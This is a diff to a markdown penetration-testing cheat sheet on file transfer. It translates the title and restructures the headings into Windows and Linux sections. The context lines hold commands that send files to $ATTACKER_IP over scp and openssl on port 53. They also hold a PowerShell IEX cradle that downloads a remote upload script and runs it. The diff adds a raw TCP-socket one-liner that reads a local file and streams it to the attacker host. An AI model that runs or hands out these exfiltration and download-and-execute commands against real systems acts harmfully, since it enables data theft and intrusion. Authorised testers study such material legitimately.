@@ -1,4 +1,4 @@
-# 📂 Transfert
+# 📂 Transfer
 
 > In penetration testing, file transfer is an essential part of the process. It can be used to move files between systems, upload payloads, and exfiltrate data.
 
@@ -104,10 +104,10 @@ SSH is often allowed outbound and encrypted by default. Good choice for discreet
 ::: code-group
 
 ```bash [scp]
-# Client → Server (upload)
+# Client -> Server (upload)
 scp /path/to/file user@$ATTACKER_IP:/path/to/dir
 
-# Server → Client (download)
+# Server -> Client (download)
 scp user@$ATTACKER_IP:/path/to/file /local/dir
 ```
 
@@ -166,7 +166,9 @@ openssl s_client -quiet -connect $ATTACKER_IP:53 < file
 
 > DNS (53) is rarely blocked outbound, but slow. Use as a fallback when HTTP and SSH are blocked.
 
-## Windows
+## LOLBINS
+
+### Windows
 
 :::tabs
 
@@ -188,6 +190,10 @@ iwr http://$ATTACKER_IP:$ATTACKER_PORT/file -OutFile file
 ```powershell [upload]
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 Invoke-FileUpload -Uri $URL -File <file>
+```
+
+```powershell [socket_raw]
+$c=New-Object Net.Sockets.TcpClient("$ATTACKER_IP",$ATTACKER_PORT);$s=$c.GetStream();$s.Write(($b=[IO.File]::ReadAllBytes("C:\Path\file")),0,$b.Length);$c.Close()
 ```
 
 == LOLBins
@@ -213,7 +219,7 @@ bitsadmin /transfer job /download /priority foreground http://$ATTACKER_IP:$ATTA
 
 :::
 
-## Linux
+### Linux
 
 ::: code-group
 
